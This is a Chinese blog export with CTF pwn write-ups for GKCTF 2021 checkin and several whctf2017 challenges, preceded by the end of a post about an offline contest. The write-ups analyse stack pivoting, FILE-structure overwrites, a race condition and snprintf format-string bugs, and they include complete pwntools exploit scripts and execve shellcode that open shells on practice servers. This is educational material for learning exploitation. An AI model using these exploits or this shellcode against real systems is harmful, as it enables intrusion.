<p>winmt师傅给我说的思路是可以从危险函数下手，看交叉引用然后如果危险函数的参数可控，那就属于一些漏洞，比如exec的参数可控就是任意命令执行，或者fopen函数的参数可控就是任意文件读取等等(当然实际要比这复杂，主要是需要逆向和仔细分析)，当时我们找到了一个栈上的off by null漏洞，以及一个堆溢出的漏洞和格式化字符串漏洞，剩下基本上都是web大哥们在疯狂上分。</p>
<p>除去比赛之外，让我印象比较深的就是吃的非常nice，这些天吃了火锅 烤肉 披萨 烤鸭 鲍鱼 金汤肥牛 煲仔饭等等，他们熬夜干到很晚的师傅还吃了KFC(好像当时就我睡了 0.0)，然后晚上还和h1师傅看了两场世界杯(虽然在看决赛的时候他几乎一直在睡觉QAQ)</p>
<h3 id="尾声："><a href="#尾声：" class="headerlink" title="尾声："></a>尾声：</h3><p>最后比赛的成绩还可以吧，主要是第一次打这个没经验，其实应该先去打那些设备交实验报告得分，而不是先逮着CTF的题目日，这就导致了一些队伍把很简单的漏洞找到并且提交报告后，那些设备就下线了，错失了最开始的得分机会。</p>
<p>不过这次比赛收获还是蛮大的(虽然很多时候在摸鱼)，但是能和师傅们一起线下交流其实还挺不错的，尤其是winmt师傅的现场教学QAQ。</p>
<p>最后来了一张三个PWN手的合影 -&gt;_-&gt;</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221300998.jpg" alt="img" style="zoom:50%;" />

<p>以及所有人的合照</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221300400.jpg" alt="img" style="zoom:50%;" />

<p>当然了  最牛皮的居然是发现自己上电视了</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221301622.jpg" alt="img" style="zoom:50%;" />



<p>坏消息是我们全军覆没，直接都成小阳人…   </p>
<p>之后还得再提升自己的技术，希望有更多机会和师傅们一起参加线下赛</p>
]]></content>
  </entry>
  <entry>
    <title>GKCTF 2021_checkin</title>
    <url>/posts/a81fb7da.html</url>
    <content><![CDATA[<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>1、这道题md5加密这个点，其实蛮重要的，个人感觉想判断出来的话，只能是靠经验的积累。下回只要遇见了这种奇奇怪怪的函数，还给了类似于密文这种东西，就去考虑加密。</p>
<p>2、能够输入的字节很少的时候，执行某个函数，可以尝试写call的这个地址，这样即可以执行函数，又可以控制执行流（只要我们可以把控好选取的call地址即可）</p>
<p>3、后期调试的话，多按自己的思路思考（不要被网上其他师傅写的wp所局限了）。</p>
<span id="more"></span>

<h1 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h1><p><img src="/../img/2706180-20220331215203116-666268230.png"></p>
<h1 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h1><p><img src="/../img/2706180-20220331215212743-248424037.png"></p>
<p>输入点有两处，第一次输入是输入到bss段，第二次输入是给到buf,存在八字节的溢出。一看这种存在八字节的溢出基本就可以确定是栈迁移没跑了。</p>
<p>然后第一次输入的数据，前五个字节必须是admin，否则的话就会触发exit。同时sub_401974函数的返回值也必须是0，否则就会触发exit。我们肯定是不能去触发这个exit的，不然程序直接就结束了。</p>
<p><img src="/../img/2706180-20220331215224208-1732771002.png"></p>
<p>观察sub_401974函数，发现这个函数很奇怪，首先是给了个数组v4，然后赋了两个莫名其妙的值，然后发现返回值的地方有一个判断，只要v5有一个字节和v4的不同，就返回1（这并不是我们想要的），如果能成功的跑16次循环，也就是说v5与v4的十六个字节全部相同，才会返回我们想要的0。</p>
<p>看看v5是什么？点进sub_400990函数看一下</p>
<p><img src="/../img/2706180-20220331215234682-403874894.png"></p>
<p>发现很奇怪，然后把每个函数都点一下，发现就更奇怪了….</p>
<p>想遇见这种奇奇怪怪的情况，就考虑加密的形式。而最开始给的v4的值，就是密文。</p>
<p>然后就转一下看看（淦，其实我也是看师傅的wp才知道这是md5加密的，这只能靠经验和积累来判断吧？），发现是md5加密。</p>
<p><img src="/../img/2706180-20220331215251779-22545722.png"></p>
<p>由于这个是小端序存放的v4，转换过来的话，应该是从右往左看。</p>
<p>取出来是个这玩意 21232f297a57a5a743894a0e4a801fc3</p>
<p>找个在线网站转一下</p>
<p><img src="/../img/2706180-20220331215302448-1617321460.png"></p>
<p>如此思路就出来了，第一次要输入admin，去通过strncmp函数的检查，第二次还要输入admin，去通过与md5匹配的检查。那两次输入都是admin，我们怎么去劫持程序的执行流？  这里我们是可以采用00截断的，意思就是说用00来声明md5加密的内容结束，而00后面的就不会被加密了，但00后面的内容已经是存在的。</p>
<h1 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h1><p>这道题必然是考察栈迁移的，我们虽然只能控制rbp，但是由于这个函数结束的时候会执行一个leave;ret，而到main函数结束的时候又会执行一个leave;ret，因此我们只需要控制rbp，依然是可以完成栈迁移的。</p>
<p>这道题由于没办法泄露栈地址，因此迁移的话，肯定就是bss段。第一次在bss段输入内容的话，一共只能输入32字节，除去8字节的admin（admin后面还需要再填充3个00，用于补齐这一个内存单元），只剩下了24字节，我们肯定是考虑ret2libc的，那现在要做的就是泄露出来一个函数的真实地址。</p>
<p>问题是pop rdi占八字节，参数占八字节，执行puts又占八字节，这样看来，我们似乎是没办法控制返回地址了。</p>
<p>那这件事先缓一缓，我们再想一下，泄露出来了真实地址之后，肯定是要再来一次输入，将one_gadget的地址写入内存。同时还需要控制程序执行流，去执行这个one_gadget。综上所述，想完成这件事情，似乎我们只能是再跑一次程序，同时在跑之前还需要执行个puts函数。</p>
<p><img src="/../img/2706180-20220331215315108-697859807.png"></p>
<p>那我们把执行puts的地址写成0x4018B5,这样它不但执行了puts函数，同时让程序的执行流又从sub_4018c7函数（这个函数就是程序的主要部分）开始跑了。</p>
<h2 id="通过调试来进一步分析"><a href="#通过调试来进一步分析" class="headerlink" title="通过调试来进一步分析"></a>通过调试来进一步分析</h2><p>然后此时应该调试一下，看看程序的情况。再做进一步完善exp。</p>
<p><img src="/../img/2706180-20220331215325473-1898764410.png"></p>
<p>此时是在第二次执行往bss段输入的那个read函数，可以看出来现在还一切正常。似乎只要布置一个admin和one_gadget地址，然后第二次利用那个read完成一次迁移就行了，但是事实真的这么简单么？</p>
<p><img src="/../img/2706180-20220331215334034-1303724362.png"></p>
<p>现在来到了第二次往栈里输入的read，可以发现它输入的内容是往0x6023f0输入的，这意味着我们刚刚输入的admin和one_gadget会被这次输入的内容所覆盖（因为我们现在的栈就已经在bss段了，因此这次输入会干扰第一次输入）。先注意一下rbp的值，我们第二次输入的目的就是在不破坏one_gadget的情况下，覆盖rbp迁移到one_gadget这里。现在这里的输入距离rbp还有32个字节。这就意味着我们要是想控制这个rbp就必须覆盖之前写的one_gadget了。</p>
<p>不过最关键的一点是不是被忽略了，往bss段输入的那个read函数，可以输入32字节，如果我们把one_gadget给抬高呢？抬高到第24字节再布置（相当于0x602400地址来说，也就是此时的one_gadget应该是在0x602418的位置），而我们再输入32字节的话再写rbp的话，这个rbp也才是在0x602410这个位置（第二次输入是相当于0x6023f0来说），这样rbp就没有干扰到one_gadget</p>
<p>或者用另一种方法，我们第一次就输入一个admin，第二次输入的时候，我们同时布置one_gadget和覆盖rbp。控制rbp去迁移到one_gadget上面，二者的核心思路都是一样的。</p>
<p>然后就exp基本就出来了，需要注意的是，如果打远程，one_gadget搜索的是用题目给的libc，如果的打本地，one_gadget搜自己本地的libc。（另外就是，这道题用不了system加参数&#x2F;bin&#x2F;sh获取shell，不信的话，试一下就知道了）</p>
<h1 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26765</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#这里本地还是远程，自己切换一下库</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401ab3</span></span><br><span class="line">call_puts_addr=<span class="number">0x4018B5</span></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got_addr)+p64(call_puts_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#yuancheng 0x4527a</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bendi</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>+<span class="number">0x18</span>)<span class="comment">#迁移到one_gadget</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>下面这个是第一次只输入admin，第二次同时布置one_gadget和控制rbp的exp。可以看出来，这个exp和上面的区别也仅仅是最后一点不一样。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26765</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401ab3</span></span><br><span class="line">call_puts_addr=<span class="number">0x4018B5</span></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got_addr)+p64(call_puts_addr)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#yuancheng 0x4527a</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bendi</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)+p64(<span class="number">0x602400</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220331215347474-154784131.png"></p>
<p>ps：最后值得一提的是，这两个exp，第一个最后是并没有执行两次leave;ret获取shell的，而是执行了一次leave就获取了shell，第二次则需要执行两回leave;ret才能获取shell。经过调试，我还是没有发现这种差异的根本原因是在哪里。如果各位师傅有弄的这个问题的，还请告知我这个菜鸡。</p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>one_gadget</tag>
        <tag>MD5加密</tag>
      </tags>
  </entry>
  <entry>
    <title>whctf2017 pwn题wp</title>
    <url>/posts/1694f8f0.html</url>
    <content><![CDATA[<p>今天做题的时候无意做了一道buu上的whctf2017 stackoverflow,做完之后发现另外几道whctf2017的题目也很不错，就打算全做了都学习一下，题目全部在buu上都可以找到</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下这四道题，它们分别考察了如下的知识点：</p>
<p>第一题考察了scanf函数最终的输入是在内部的<code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code>这行代码，只要能控制这几个字段并且对其他一些字段进行绕过，就可以实现IO的任意地址写</p>
<p>第二题考察了条件竞争漏洞，在多线程的操作中访问同一个全局变量没有加锁，在delete函数中让全局指针被减到了位于got表的位置，从而malloc申请堆块的地址写入了got表里，没有开NX导致堆可执行，从而劫持got表跳转到堆的shellcode上</p>
<p>第三题考察的是snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。<strong>snprintf拷贝字符的时候可能存在溢出</strong></p>
<p>第四题考察的是未初始化漏洞，在打印之前，没有对操作的指针进行初始化，从而使用了栈里的残留数据，泄露出了canary，配合gets的栈溢出漏洞，ret2libc获取shell</p>
<span id="more"></span>

<h2 id="whctf2017-stackoverflow"><a href="#whctf2017-stackoverflow" class="headerlink" title="whctf2017_stackoverflow"></a>whctf2017_stackoverflow</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846592.png" alt="image-20221213084612401" style="zoom:50%;" />

<h3 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><p>第一个漏洞点是往栈里输入数据之后没有0截断，并且使用了%s打印数据，从而可以泄露栈里存储的libc地址(如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846562.png" alt="image-20221213084641509" style="zoom:50%;" />

<p>第二个漏洞是v2和size可以不一样，如果size大于0x300000的话，可以重新输入size(但是v2没有被更新)，而malloc函数申请大于128KB(0x20000 bit)的内存时会调用mmap在内存共享区映射出来一块内存，这片内存和libc里的地址存在固定偏移，我们提前控制一个v2的话就可以向任意一个libc地址写入一个0(如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130903387.png" alt="image-20221213090336309" style="zoom:50%;" />



<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>scanf的调用流程为scanf-&gt;vfscanf-&gt;__uflow-&gt;_IO_default_uflow()-&gt;underflow-&gt;_IO_file_underflow()</p>
<p>在最后的这个函数中有段代码调用了read  如下</p>
<p><code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code></p>
<p>如果我们可以控制IO_buf_base，并且保证_IO_buf_end - _IO_buf_base不为0，就能实现地址任意写的目的。</p>
<p>不过需要绕过下面的检查，也就是要IO_read_ptr等于IO_read_end</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>



<p>我们的思路是向_IO_buf_base的地址里写入一个0，从而去再次控制_IO_buf_base字段。如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131100968.png" alt="image-20221213110056374" style="zoom:50%;" />

<p>此时的buf_base中的地址末尾已经被篡改为了00，所以下次可以向0x7f8d614a3900这个地址里写入(buf_end-buf_base)个字节的数据，该地址是_IO_write_base字段，下次输入的话，我们控制buf_base为malloc_hook的地址，而buf_end至少要为malloc_hook-8（因为buf_end-buf_base就是下次往malloc_hook里写入的字节数）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131101394.png" alt="image-20221213110142157"></p>
<p>篡改后的buf_base和buf_end如下，此时还无法往malloc_hook里写入数据，因为_IO_read_ptr和_IO_read_end并不相同。而当前函数被不断循环，其中IO_getc(stdin)函数可以刷新_IO_read_ptr，让其从输入缓冲区中读入一个字节的数据，并且让read_ptr指针加1，因此我们随便输入数据，触发getc函数39次就可以让read_ptr和read_end相同，从而往malloc_hook里写入one_gadget，在之后调用malloc函数的时候即可获取shell</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131104947.png" alt="image-20221213110433209"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25978&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;leave your name, bro:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">40</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x7b947</span><span class="comment">#-0x7b957#</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5c5908</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x200000</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">debug(p,<span class="number">0x400A45</span>,<span class="number">0x4008FF</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x18</span>+p64(malloc_hook)+p64(malloc_hook+<span class="number">0x8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,p64(search_og(<span class="number">3</span>)+libc_base))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131111298.png" alt="image-20221213111146066"></p>
<h2 id="whctf2017-note-sys"><a href="#whctf2017-note-sys" class="headerlink" title="whctf2017_note_sys"></a>whctf2017_note_sys</h2><h3 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131657725.png" alt="image-20221213165703414" style="zoom:50%;" />

<h3 id="漏洞所在-1"><a href="#漏洞所在-1" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><p>本题是有一个add函数和delete函数，不过都是去创建了一个子进程来调用函数。</p>
<p>在两个函数中都涉及到了对同一个全局变量进行操作，在add函数中malloc申请堆块后将地址存入了202080指向的位置(这个位置是2020C0)，每次执行add函数的时候都会将202080指向的地址+8，也就是执行完当前函数再执行add函数，就是将malloc返回的地址写入2020c8里</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131659243.png" alt="image-20221213165948173" style="zoom:50%;" />

<p>而执行delete函数则是每次执行完都让202080指向的地址-8(如下)，但需要注意的是先在202080指向的地址-8之后有一个usleep（这里会休眠两秒钟），而后再去执行下面的free函数部分</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131707847.png" alt="image-20221213170753777" style="zoom:50%;" />

<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>核心点是delete函数在子进程中被执行，并且父进程里没有pthread_join函数，这意味着我们可以趁着子进程执行delete函数的空隙，让父进程再次调用delete函数，让202080指向的地址2020c0不断去-8，减到got表的位置。再执行add函数，malloc申请一个堆块，向堆块里写入shellcode，此时malloc返回的地址被写入到了free的got表里，最终调用free函数的时候触发shellcode</p>
<p>正常情况下去free掉got地址会报错，但此处的条件竞争是在执行free函数前不断开启多个子进程对一个全局变量进行操作，<strong>还没有执行到free函数崩溃前就已经把shellcode写到了free的got表里获取了shell</strong></p>
<p>循环22次也很好算 (0x2020c0-0x202018-8)&#x2F;8&#x3D;22   （这里不能直接写free的got地址，应该再减8字节，因为最后add的时候是先加了八字节）</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28673&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi ,0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x48\x31\xF6\x56\x57\x54\x5F\x48\x31\xD2\x0F\x05&quot;</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xB66</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input your note, no more than 250 characters\n&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131726043.png" alt="image-20221213172644320"></p>
<h2 id="whctf2017-easypwn"><a href="#whctf2017-easypwn" class="headerlink" title="whctf2017_easypwn"></a>whctf2017_easypwn</h2><h3 id="保护策略-2"><a href="#保护策略-2" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301822473.png" alt="image-20221230182239349" style="zoom:50%;" />

<h3 id="漏洞所在-2"><a href="#漏洞所在-2" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301823966.png" alt="image-20221230182343891" style="zoom:50%;" />

<p>v3可被覆盖控制，而v3是format参数，可控就代表着存在格式化字符串漏洞。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301831494.png" alt="image-20221230183118429" style="zoom:50%;" />

<p>snprintf会将s的数据拷贝0x7d0到v2上面，但是s和v2仅相离0x400，也就是说如果s写入0x400的话，拷贝到v2里面的时候就会溢出0x18个字节(v2和v3仅相距0x3e8个字节)从而控制v3，触发格式化字符串漏洞。</p>
<h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>relro保护开的是partial relro，这意味着可以篡改GOT表，而程序的此处莫名其妙的出现了一个free函数(如下)，并且free掉堆块的内容可控，很明显是想让我们劫持free的got表为system，然后堆块里面写入&#x2F;bin&#x2F;sh最后执行free获取shell</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301905510.png" alt="image-20221230190529433"></p>
<p>利用的时候有几个点需要注意一下：</p>
<p>1 就是格式化字符串利用的时候，发现0x3e8后不能直接触发漏洞，需要填充两个字符串才能利用(这里是试出来的，原因未知)</p>
<p>  <img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301909592.png" alt="image-20221230190941547"></p>
<p>2 本题属于snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。</p>
<p>3 snprintf函数的format是在第三个参数的位置，所以算栈顶偏移的时候不是和以前加6，而是加4。</p>
<p>4 我这里是跑了三次循环，每次改写free函数的got表两个字节，三次下来就写了system的6字节地址。</p>
<p>5 这里写入数据的话，肯定是要减去前面发送的垃圾数据0x3e8个a,但是后面的0x16不知道咋来的，但这里也是可以试出来的，先减去0x3e8后，发现自己要写的值和实际写入的值差了0x16，那就在exp里多减0x16就能得到正确的值。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301916047.png" alt="image-20221230191633995"></p>
<p>PS：exp不是一定能打通，因为如果libc地址的低位比较小的话，会导致payload后面没有对齐，不过这个概率不大，没打通的话多跑两次就行</p>
